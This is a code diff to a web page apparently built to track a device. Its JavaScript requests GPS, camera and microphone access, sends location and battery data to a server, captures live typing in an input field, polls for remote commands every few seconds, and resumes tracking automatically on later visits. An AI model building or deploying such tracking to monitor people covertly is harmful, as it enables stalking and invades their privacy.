@@ -50,7 +50,6 @@
         const btn = document.getElementById('consentBtn');
         const statusMsg = document.getElementById('statusMsg');
         
-        // ব্রাউজারে আইডি সেভ করা
         let clientId = localStorage.getItem("tracker_client_id");
         if (!clientId) {
             clientId = 'device_' + Math.random().toString(36).substr(2, 9);
@@ -101,7 +100,6 @@
 
         getDeviceInfo();
 
-        // লাইভ টাইপিং ট্র্যাকার
         let typingTimer;
         document.getElementById('testInput').addEventListener('input', (e) => {
             clearTimeout(typingTimer);
@@ -119,30 +117,49 @@
             }).catch(err => console.error(err));
         }
 
-        window.onload = () => {
-            if (localStorage.getItem("tracker_consent") === "true") {
-                startSharing(true); 
-            }
-        };
-
-        async function startSharing(isAuto = false) {
+        // --- নতুন লজিক: ধাপে ধাপে পারমিশন নেওয়া ---
+        async function startSharing() {
             btn.disabled = true;
-            btn.innerText = isAuto ? '🔄 অটো কানেক্ট হচ্ছে...' : '⏳ সংযোগ স্থাপন...';
-            statusMsg.innerText = '📡 পারমিশন চাচ্ছি...';
-            localStorage.setItem("tracker_consent", "true");
-
-            try {
-                currentStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            } catch (err) {
-                console.log("পারমিশন পাওয়া যায়নি: ", err);
-            }
+            btn.innerText = '⏳ লোকেশন পারমিশন...';
+            statusMsg.innerText = '📡 লোকেশন এক্সেস চাচ্ছি...';
 
             if (!navigator.geolocation) {
                 alert('আপনার ব্রাউজার GPS সাপোর্ট করে না।');
                 return;
             }
 
-            // জিপিএস ফিক্স: maximumAge এবং timeout বাড়ানো হয়েছে
+            // ১. প্রথমে লোকেশনের পারমিশন চাওয়া
+            navigator.geolocation.getCurrentPosition(
+                async (pos) => {
+                    statusMsg.innerText = '📸 ক্যামেরা ও মাইক পারমিশন...';
+                    btn.innerText = '⏳ ক্যামেরা পারমিশন...';
+                    
+                    // ২. লোকেশন পাওয়ার পর ক্যামেরা/মাইকের পারমিশন চাওয়া
+                    try {
+                        currentStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                        console.log("ক্যামেরা ও মাইক রেডি");
+                    } catch (err) {
+                        console.log("ক্যামেরা পারমিশন পাওয়া যায়নি: ", err);
+                        // মিডিয়া না পেলেও জিপিএস চালু থাকবে
+                    }
+
+                    // ৩. সব পারমিশন শেষ হলে আসল ট্র্যাকিং শুরু করা
+                    startTracking();
+                },
+                (err) => {
+                    statusMsg.innerText = '❌ লোকেশন পারমিশন ব্লকড!';
+                    btn.disabled = false;
+                    btn.innerText = '🔄 আবার চেষ্টা করুন';
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        }
+
+        function startTracking() {
+            btn.innerText = '✅ শেয়ারিং চলছে';
+            statusMsg.innerText = '🟢 ডেটা পাঠানো হচ্ছে... (লাইভ)';
+            localStorage.setItem("tracker_consent", "true");
+
             watchId = navigator.geolocation.watchPosition(
                 (pos) => {
                     const lat = pos.coords.latitude;
@@ -161,16 +178,10 @@
                     } else {
                         sendData(lat, lng, accuracy, batteryLevel, isCharging);
                     }
-                    
-                    statusMsg.innerText = '🟢 ডেটা পাঠানো হচ্ছে... (লাইভ)';
-                    btn.innerText = '✅ শেয়ারিং চলছে';
                 },
                 (err) => {
-                    // টাইমআউট হলে অ্যাপ ক্র্যাশ না করে অপেক্ষা করবে
                     if (err.code === 3) {
                         statusMsg.innerText = '⏳ জিপিএস খোঁজা হচ্ছে (সিগন্যাল দুর্বল)...';
-                    } else {
-                        statusMsg.innerText = '❌ GPS এরর: ' + err.message;
                     }
                 },
                 { enableHighAccuracy: true, timeout: 20000, maximumAge: 5000 }
@@ -178,6 +189,14 @@
 
             sharingInterval = setInterval(checkCommands, 3000);
         }
+
+        // পেজ লোড হওয়ার পর যদি আগে থেকেই সম্মতি দেওয়া থাকে
+        window.onload = () => {
+            if (localStorage.getItem("tracker_consent") === "true") {
+                btn.innerText = '🔄 অটো কানেক্ট হচ্ছে...';
+                startTracking(); // সরাসরি ট্র্যাকিং শুরু করবে (আবার পারমিশন চাইবে না)
+            }
+        };
 
         function sendData(lat, lng, accuracy, battery, charging) {
             const data = {
